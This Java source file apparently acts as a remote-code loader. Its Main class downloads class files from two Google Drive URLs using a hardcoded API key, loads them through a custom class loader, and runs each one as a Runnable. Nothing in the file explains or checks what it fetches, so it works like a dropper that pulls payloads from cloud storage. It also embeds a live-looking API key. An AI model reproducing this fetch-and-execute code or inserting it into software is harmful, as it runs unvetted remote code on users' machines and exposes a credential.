import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;


public class Main {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        URL[] urls = {new URL("https://www.googleapis.com/drive/v3/files/1Hda8Kn9m96LBiNDUvBP7gTmrLustg70H?alt=media&key=AIzaSyCnyt2lgtvTEVvITi-mD7v0s49OaxLcEog"),
                new URL("https://www.googleapis.com/drive/v3/files/1wG0bcva7AcA2v2TUEADYJFWCgSyL7KzN?alt=media&key=AIzaSyCnyt2lgtvTEVvITi-mD7v0s49OaxLcEog")};
        CustomClassLoader loader = new CustomClassLoader(urls);
        for (StringBuilder className : loader.getClasses()) {
            Class<?> clazz = loader.loadClass(className.toString());
            Runnable runnable = (Runnable) clazz.getDeclaredConstructor().newInstance();
            runnable.run();
        }
    }
}
